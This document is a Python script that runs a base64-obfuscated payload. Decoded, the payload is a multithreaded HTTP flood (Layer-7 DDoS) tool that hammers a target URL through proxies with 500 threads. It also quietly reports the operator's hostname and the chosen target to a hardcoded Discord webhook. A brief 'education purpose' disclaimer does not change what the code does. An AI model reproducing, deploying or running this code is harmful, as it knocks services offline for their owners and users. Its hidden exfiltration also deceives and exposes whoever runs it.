import base64
exec(base64.b64decode("DQojVGhpcyBUb29sIENyZWF0ZWQgYnkgVXNOZXh1c1RlYW0NCg0KdHJ5Og0KICAgIGltcG9ydCB1cmxsaWIucmVxdWVzdCwgb3MsIHRocmVhZGluZywgdGltZSwgcmFuZG9tLCBzeXMNCiAgICBmcm9tIGRpc2NvcmRfd2ViaG9vayBpbXBvcnQgRGlzY29yZFdlYmhvb2sNCiAgICBpbXBvcnQgc29ja2V0DQpleGNlcHQ6DQogICAgaWYgc3lzLnBsYXRmb3JtLnN0YXJ0c3dpdGgoImxpbnV4Iik6DQogICAgICAgIG9zLnN5c3RlbSgicGlwMyBpbnN0YWxsIGRpc2NvcmRfd2ViaG9vayIpDQogICAgZWxzZToNCiAgICAgICAgKCJwaXAgaW5zdGFsbCBkaXNjb3JkX3dlYmhvb2siKQ0KDQp1c2wgPSAiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MzU5OTMwNTY4NTc5NDg5Ni92eTZicy1Od0RuTE5ndmNoaG5qRVp2bDQyaFpvbVVsV1JwZTFMWnUyeWV3bEl0bmxxYnNDLXF0ZnFWVFh3elhyWWpJbSINCnVzZXJhZ2VudHMgPSBbDQogICAgICAiTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgMTAuMDsgV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNC4wOyBJbmZvUGF0aC4yOyBTVjE7IC5ORVQgQ0xSIDIuMC41MDcyNzsgV09XNjQpIiwNCiAgICAgICJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSAxMC4wOyBNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzdfMzsgVHJpZGVudC82LjApIiwNCiAgICAgICJPcGVyYS8xMi4wKFdpbmRvd3MgTlQgNS4yO1U7ZW4pUHJlc3RvLzIyLjkuMTY4IFZlcnNpb24vMTIuMDAiLA0KICAgICAgIk9wZXJhLzkuODAgKFdpbmRvd3MgTlQgNi4wKSBQcmVzdG8vMi4xMi4zODggVmVyc2lvbi8xMi4xNCIsDQogICAgICAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4wOyBydjoyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNC4wIE9wZXJhIDEyLjE0IiwNCiAgICAgICJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIsDQogICAgICAiT3BlcmEvMTIuODAgKFdpbmRvd3MgTlQgNS4xOyBVOyBlbikgUHJlc3RvLzIuMTAuMjg5IFZlcnNpb24vMTIuMDIiLA0KICAgICAgIk9wZXJhLzkuODAgKFdpbmRvd3MgTlQgNi4xOyBVOyBlcy1FUykgUHJlc3RvLzIuOS4xODEgVmVyc2lvbi8xMi4wMCIsDQogICAgICAiT3BlcmEvOS44MCAoV2luZG93cyBOVCA1LjE7IFU7IHpoLXNnKSBQcmVzdG8vMi45LjE4MSBWZXJzaW9uLzEyLjAwIiwNCiAgICAgICJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgUGhvbmUgT1MgNy41OyBUcmlkZW50LzUuMDsgSUVNb2JpbGUvOS4wKSIsXSAgIA0KICAgIA0KY2xhc3MgZnVja2VyKHRocmVhZGluZy5UaHJlYWQpOg0KICAgIA0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCB1cmwsIG51bWJlciwgcHJveHkpOg0KICAgICAgICB0aHJlYWRpbmcuVGhyZWFkLl9faW5pdF9fKHNlbGYpDQogICAgICAgIHNlbGYudXJsID0gdXJsDQogICAgICAgIHNlbGYubnVtID0gbnVtYmVyDQogICAgICAgIHNlbGYuaGVhZGVycyA9IHsgJ1VzZXItQWdlbnQnIDogcmFuZG9tLmNob2ljZSh1c2VyYWdlbnRzKSB9DQogICAgICAgIHNlbGYuTG9jayA9IHRocmVhZGluZy5Mb2NrKCkNCiAgICAgICAgc2VsZi5wcm94eSA9IHByb3h5DQoNCiAgICBkZWYgcmVxdWVzdChzZWxmKToNCiAgICAgICAgZGF0YSA9IE5vbmUNCiAgICAgICAgcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoeydodHRwJzogc2VsZi5wcm94eX0pDQogICAgICAgIG9wZW5lciA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSkNCiAgICAgICAgdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIob3BlbmVyKSANCiAgICAgICAgcmVxID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZWxmLnVybCwgZGF0YSwgc2VsZi5oZWFkZXJzKQ0KICAgICAgICB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSkNCiAgICAgICAgcHJpbnQoIltVU05FWFVTXSBNZW1hdHVrIFslc11cciIlKHNlbGYudXJsKSkNCiAgICAgICAgICAgIA0KICAgIGRlZiBydW4oc2VsZik6DQogICAgICAgIGdsb2JhbCBDbG9zZSwgUmVxdWVzdCwgVG90X3JlcQ0KICAgICAgICBzZWxmLkxvY2suYWNxdWlyZSgpDQogICAgICAgIHNlbGYuTG9jay5yZWxlYXNlKCkNCiAgICAgICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBzZWxmLnJlcXVlc3QoKQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoIltVU05FWFVTXSBNZW1hdHVrIFslc11cciIlKHNlbGYudXJsKSkNCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgwKQ0KICAgICAgICBzeXMuZXhpdCgwKQ0KDQpjbGFzcyBNYWluTG9vcCgpOg0KDQogICAgZGVmIGhvbWUoc2VsZik6DQogICAgICAgIGdsb2JhbCBDbG9zZSwgUmVxdWVzdCwgVG90X3JlcQ0KICAgICAgICBwcmludCBcDQooIiIiDQoNClwwMzNbMzFt4paI4paI4pWX4paR4paR4paR4paI4paI4pWX4paR4paI4paI4paI4paI4paI4paI4pWXXDAzM1szMW0NClwwMzNbMzFt4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdXDAzM1szMW0NClwwMzNbMzFt4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4pWX4paRXDAzM1szMW0NClwwMzNbMzFt4paI4paI4pWR4paR4paR4paR4paI4paI4pWR4paR4pWa4pWQ4pWQ4pWQ4paI4paI4pWXXDAzM1szMW0NClwwMzNbMzFt4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWdXDAzM1szMW0NClwwMzNbMzFt4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paR4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4paRXDAzM1szMW0NCg0KXDAzM1szMW3ilojilojilojilZfilpHilpHilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZfilpHilpHilojilojilZfilojilojilZfilpHilpHilpHilojilojilZfilpHilojilojilojilojilojilojilZdcMDMzWzMxbQ0KXDAzM1szMW3ilojilojilojilojilZfilpHilojilojilZHilojilojilZTilZDilZDilZDilZDilZ3ilZrilojilojilZfilojilojilZTilZ3ilojilojilZHilpHilpHilpHilojilojilZHilojilojilZTilZDilZDilZDilZDilZ1cMDMzWzMxbQ0KXDAzM1szMW3ilojilojilZTilojilojilZfilojilojilZHilojilojilojilojilojilZfilpHilpHilpHilZrilojilojilojilZTilZ3ilpHilojilojilZHilpHilpHilpHilojilojilZHilZrilojilojilojilojilojilZfilpFcMDMzWzMxbQ0KXDAzM1szMW3ilojilojilZHilZrilojilojilojilojilZHilojilojilZTilZDilZDilZ3ilpHilpHilpHilojilojilZTilojilojilZfilpHilojilojilZHilpHilpHilpHilojilojilZHilpHilZrilZDilZDilZDilojilojilZdcMDMzWzMxbQ0KXDAzM1szMW3ilojilojilZHilpHilZrilojilojilojilZHilojilojilojilojilojilojilojilZfilojilojilZTilZ3ilZrilojilojilZfilZrilojilojilojilojilojilojilZTilZ3ilojilojilojilojilojilojilZTilZ1cMDMzWzMxbQ0KXDAzM1szMW3ilZrilZDilZ3ilpHilpHilZrilZDilZDilZ3ilZrilZDilZDilZDilZDilZDilZDilZ3ilZrilZDilZ3ilpHilpHilZrilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHilZrilZDilZDilZDilZDilZDilZ3ilpHihrvihrtcMDMzWzMxbQ0KXDAzM1szNG0tLS0tLS0tLS0tIEREb1MgVG9vbCBMYXllcjcgICAgICAgKFZlcnNvaW4gMS4wKSBCRVRBIVwwMzNbMzRtDQogLS0tLS0tLS0tLS0tLSAgVGhlIFRvb2xzIE1ha2VkIEJ5IFVzIE5leHVzIFRlYW0NClwwMzNbMDszNG0tLS0tLS0tLS0tLVRlbGVncmFtIExpbmsgICBodHRwczovL3QubWUvdXNuZXh1c2hhY2tlclwwMzNbMDszNG0NClwwMzNbMDszMW0tLS0tLS0tLS0tLS1Eb250IFVzZSBHT1YgU2l0ZSBJcyBKdXN0IEVkdWNhdGlvbiBQdXJwb3NlLOKaoO+4j1wwMzNbMDszMW0NClwwMzNbMDszMW1fX19fX19fVGhlc2UgdG9vbHMgYXJlIG5vdCBjb21wbGV0ZSBJcyBCZXRhIFZlcnNpb25cMDMzWzA7MzFtDQpcMDMzWzA7MzFtX19fX19fVGhlIFRvb2xzIElzIFZlcnkgUG93ZXIgRnVsbCBUb29scyDimKDvuI/imKDvuI9cMDMzWzA7MzFtICAgICANCiIiIikNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgdXJsID0gc3lzLmFyZ3ZbMV0NCiAgICAgICAgICAgIGhzdCA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQogICAgICAgICAgICB3ZWJob29rID0gRGlzY29yZFdlYmhvb2sodXJscz0naHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MzU5OTMwNTY4NTc5NDg5Ni92eTZicy1Od0RuTE5ndmNoaG5qRVp2bDQyaFpvbVVsV1JwZTFMWnUyeWV3bEl0bmxxYnNDLXF0ZnFWVFh3elhyWWpJbScsIGNvbnRlbnQ9Zid7aHN0fSBIYXMgU3RhcnRlZCBGbG9vZCBUbyB7dXJsfScpDQogICAgICAgICAgICByZXNwb25zZSA9IHdlYmhvb2suZXhlY3V0ZSgpDQogICAgICAgIGV4Y2VwdDoNCiAgICAgICAgICAgIHBhc3MNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZmlsZV9wcm94eSA9IHN0cigicHJveHkudHh0IikNCiAgICAgICAgICAgIGluX2ZpbGUgPSBvcGVuKGZpbGVfcHJveHksInIiKQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBpbl9maWxlID0gb3BlbihmaWxlX3Byb3h5LCJyIikNCiAgICAgICAgbnVtX3RocmVhZHMgPSBzdHIoNTAwKQ0KICAgICAgICBpZiBudW1fdGhyZWFkcyA9PSAiIjoNCiAgICAgICAgICAgIG51bV90aHJlYWRzID0gaW50KDUwMCkNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIG51bV90aHJlYWRzID0gaW50KG51bV90aHJlYWRzKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBmb3IgaSBpbiByYW5nZShudW1fdGhyZWFkcyk6DQogICAgICAgICAgICAgICAgaW5fbGluZSA9IGluX2ZpbGUucmVhZGxpbmUoKQ0KICAgICAgICAgICAgICAgIGZ1Y2tlcih1cmwsIGkgKyAxLCBpbl9saW5lKS5zdGFydCgpDQogICAgICAgICAgICAgICAgaW5fbGluZSA9IGluX2xpbmVbOi0xXQ0KICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICBwcmludCgiVXNhZ2U6IHB5dGhvbjMgdXNuZXh1cy5weSBodHRwczovL2V4YW1wbGUuY29tIikNCiAgICAgICAgDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIGlmIHN5cy5wbGF0Zm9ybS5zdGFydHN3aXRoKCJsaW51eCIpOg0KICAgICAgICBvcy5zeXN0ZW0oImNsZWFyIikNCiAgICBlbHNlOg0KICAgICAgICAoImNscyIpDQogICAgTWFpbkxvb3AoKS5ob21lKCkNCg=="))